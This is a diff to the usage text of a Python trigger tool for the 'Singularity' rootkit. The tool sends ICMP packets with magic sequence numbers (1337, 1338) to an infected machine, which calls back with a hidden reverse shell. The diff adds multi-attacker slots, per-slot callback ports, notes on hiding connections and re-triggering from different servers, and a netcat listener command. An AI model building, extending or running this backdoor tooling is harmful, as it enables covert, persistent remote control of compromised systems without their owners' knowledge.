@@ -138,18 +138,32 @@ Arguments:
     TARGET_IP       IP of the machine infected with Singularity
 
 Options:
+    -u, --user N    Instance slot to trigger: 1 (seq 1337) or 2 (seq 1338) (default: 1)
     -c, --count N   Number of packets to send (default: 3)
     -i, --interval  Inter-packet interval in seconds (default: 1.0)
     -h, --help      Show this msg
 
+Notes:
+    Your machine's source IP is captured automatically by the rootkit and used
+    as the reverse-shell callback address - no hardcoded IP needed.
+    Each user/slot has its own predefined port:
+      Slot 1 (seq 1337) -> port 80
+      Slot 2 (seq 1338) -> port 4445
+
+    Slot assignment: each slot is identified by the ICMP sequence (-u flag),
+    NOT by IP. So user 1 can re-trigger from a different VPS at any time
+    and the rootkit will call back to the new IP. The old connection already
+    in progress stays hidden (hidden by port, not by IP). There is no 3rd IP
+    slot - if you need a 3rd attacker, change MAX_INSTANCES in include/core.h.
+
 Examples:
-    sudo {sys.argv[0]} 192.168.1.100
-    sudo {sys.argv[0]} 10.0.0.50 -c 5 -i 0.5
+    sudo {sys.argv[0]} 192.168.1.100               # trigger slot 1 (you)
+    sudo {sys.argv[0]} 192.168.1.100 -u 2          # trigger slot 2 (friend)
+    sudo {sys.argv[0]} 10.0.0.50 -c 5 -i 0.5 -u 1
 
 Prerequisites:
     1. Singularity Rootkit loaded on target machine
-    2. Active Listener: python3 singularity_listener.py
-    3. IP configured in icmp.c
+    2. Active Listener on your machine (nc -lvnp <port>)
     """)
 
 def main():
